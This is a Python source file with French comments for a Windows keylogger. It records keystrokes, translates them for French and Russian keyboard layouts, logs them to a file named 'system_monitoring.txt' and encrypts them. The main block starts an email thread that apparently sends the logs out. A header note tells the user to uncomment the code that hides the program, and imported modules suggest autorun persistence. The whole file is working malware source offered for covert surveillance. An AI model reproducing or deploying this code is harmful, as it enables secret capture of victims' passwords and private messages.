"""FICHIER DE CRÉATION DU KEYLOGGER ET DE SAUVEGARDE DANS UN FICHIER"""
"""NOTE, LA FONCTIONNALITÉ DE MASQUAGE DU KEYLOGGER EST DÉSACTIVÉE, LORS DE SON UTILISATION, ASSUREZ-VOUS DE DÉCOMMENTER LES LIGNES DE CODE CORRESPONDANTES DANS LA MÉTHODE if __name__ == '__main__':

LES LIGNES QUI CONTRÔLENT LE DÉMARRAGE DU MASQUAGE SONT :
#hide_prog_thread = threading.Thread(target=hide_prog)  
#hide_prog_thread.start()
#hide_prog_thread.join()

Ces lignes sont commentées pour que vous puissiez les décommenter et que le masquage fonctionne ;)"""

import datetime
import os
from pynput import keyboard
import ctypes
from sending_to_email import *
import threading
from hide_programm import *
from autho_run_programm import *
from encryption import main_ecrp

# DICTIONNAIRES
# dictionnaire de traduction de clés en russe
dict_key_RU = {
    81: 'й', 87: 'ц', 69: 'у', 82: 'к', 84: 'е', 89: 'н', 85: 'г', 73: 'ш', 79: 'щ', 80: 'з',
    65: 'ф', 83: 'ы', 68: 'в', 70: 'а', 71: 'п', 72: 'р', 74: 'о', 75: 'л', 76: 'д', 186: 'ж',
    90: 'я', 88: 'ч', 67: 'с', 86: 'м', 66: 'и', 78: 'т', 77: 'ь', 188: 'б', 190: 'ю', 191: '.',
    219: 'х', 221: 'ъ', 192: 'ё', 220: '\\', 222: 'э', 187: '=', 189: '-', 49: '1', 50: '2', 51: '3', 52: '4', 53: '5',
    54: '6', 55: '7', 56: '8', 57: '9', 48: '0'
}


# dictionnaire de traduction de clés en français
dict_key_FR = {
    81: 'a', 87: 'z', 69: 'e', 82: 'r', 84: 't', 89: 'y', 85: 'u', 73: 'i', 79: 'o', 80: 'p',
    65: 'q', 83: 's', 68: 'd', 70: 'f', 71: 'g', 72: 'h', 74: 'j', 75: 'k', 76: 'l', 77: 'm',
    186: 'ù', 90: 'w', 88: 'x', 67: 'c', 86: 'v', 66: 'b', 78: 'n', 188: 'é', 190: 'è', 191: '.',
    219: 'ç', 221: 'ô', 192: 'ë', 220: '\\', 222: 'ï', 187: '=', 189: '-', 49: '1', 50: '2', 51: '3', 52: '4', 53: '5',
    54: '6', 55: '7', 56: '8', 57: '9', 48: '0'
}

dict_langs = {
    1049: "RU",
    1036: "FR"  
}

# LISTES
# liste des logs
log_keys = []
# liste des logs des touches système
log_keys_sys = []


class AddTextFile:
    """CRÉATION D'UN FICHIER .TXT AVEC LES LOGS"""
    def add_el_file(self, log_key, log_key_sys):
        self.log_key = log_key
        self.file_name = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'system_monitoring.txt')
        self.log_key_sys = log_key_sys

        if len(self.log_key) == 2:
            with open(self.file_name, 'a', encoding='utf-8') as file:
                current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                file.write('\n\n')  # écriture de nouveaux éléments à partir d'une nouvelle ligne
                file.write(f'[HEURE {current_time}]   ')
                for item in self.log_key:
                    file.write(item + '\n')  # lecture de chaque élément de la liste et écriture à partir d'une nouvelle ligne

                file.write(f'|\n'
                           f'|\n'
                           f'[FIXATION DES TOUCHES SYSTÈME]   ')
                for jtem in self.log_key_sys:
                    file.write(jtem + '\n')  # lecture de chaque élément de la liste des touches système et écriture à partir d'une nouvelle ligne

            log_keys.clear()
            log_keys_sys.clear()

            main_ecrp() # lancement du script de chiffrement


class LanguageQual(AddTextFile):
    """CLASSE DE DÉTECTION DE LA LANGUE DE LA DISPOSITION"""
    @staticmethod
    def keyboardLayout():
        """Fonction de détection de la langue de la disposition"""
        # handle de la fenêtre principale
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        # thread ID de la fenêtre principale
        thread_id = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, None)
        # handle de la langue de la disposition pour ce thread
        lang_handle = ctypes.windll.user32.GetKeyboardLayout(thread_id)

        lang_id = lang_handle & 0xFFFF
        # print(lang_id)
        return lang_id


class KeyboardPrint(LanguageQual):
    """CLASSE DU KEYLOGGER"""
    def __init__(self, long_text='', long_key_sys=''):
        self.long_text = long_text
        self.long_key_sys = long_key_sys

    def on_press(self, key):
        """Fonction de détection de la pression d'une touche et de sa conversion en texte"""
        lang_id = self.keyboardLayout()  # détection de la langue de la disposition
        current_lang = dict_langs.get(lang_id, 'ERREUR')  # recherche de la langue correspondante dans le dictionnaire
        # print(f'\nLANG - {current_lang}')
        self.add_el_file(log_keys, log_keys_sys)

        if len(self.long_text) >= 100:
            log_keys.append(self.long_text)
            log_keys_sys.append(self.long_key_sys)
            self.long_text = ''
            self.long_key_sys = ''
            print(log_keys, 'LISTE')
            print(log_keys_sys, 'LISTE DES TOUCHES SYSTÈME\n\n')

        try:
            if current_lang == 'FR':
                key_FR = dict_key_FR.get(key.vk, ' NoKey ')  # recherche de la touche correspondante dans le dictionnaire français
                self.long_text += key_FR
                print(f'Touche pressée - {key_FR}')  # , Ord Code = {key.vk}. KeyEN = {key}
                print(self.long_text)
            elif current_lang == 'RU':
                key_RU = dict_key_RU.get(key.vk, ' NoKey ')  # recherche de la touche correspondante dans le dictionnaire russe
                self.long_text += key_RU
                print(f'Touche pressée - {key_RU}')  # , Ord Code = {key.vk}. KeyEN = {key}
                print(self.long_text)
        except AttributeError:
            if key == keyboard.Key.space:
                self.key_space()
            elif key == keyboard.Key.backspace and len(self.long_text) != 0:
                self.key_del()
            elif key == keyboard.Key.enter:
                self.key_enter()
            elif key == keyboard.Key.shift:
                self.key_shift()

            if key != keyboard.Key.space and key != keyboard.Key.backspace and key != keyboard.Key.enter and key != keyboard.Key.shift:
                self.long_key_sys += f'*{str(key).upper()}*   '
            print(f'Press2 - {key}')  # si une erreur survient, affichage simple, généralement des touches de modification

    # espace
    def key_space(self):
        self.long_text += ' '
        print(self.long_text)

    # suppression
    def key_del(self):
        self.long_text = self.long_text[:-1]
        print(self.long_text)

    # entrée
    def key_enter(self):
        self.long_text += ' '
        print(self.long_text)

    def key_shift(self):
        self.long_text += '*SHIFT->'
        print(self.long_text)

    def key_print(self):
        """Fonction de détection de la pression des touches"""
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


def start_keylogger():
    key = KeyboardPrint()
    # appel de la méthode key_print pour démarrer la capture des touches
    key.key_print()


def main_startup():
    # code de démarrage principal
    pass


if __name__ == '__main__':
    # threads
    keylogger_thread = threading.Thread(target=start_keylogger)
    main_email_thread = threading.Thread(target=main)
    # hide_prog_thread = threading.Thread(target=hide_prog)  # masquage du programme, fonctionne, commenté pour les tests, car le script se masque partout

    main_startup()

    # démarrage des threads
    keylogger_thread.start()
    main_email_thread.start()
    # hide_prog_thread.start()  # masquage du programme, fonctionne, commenté pour les tests, car le script se masque partout

    # attente de la fin des autres threads
    keylogger_thread.join()
    main_email_thread.join()
    # hide_prog_thread.join()  # masquage du programme, fonctionne, commenté pour les tests, car le script se masque partout




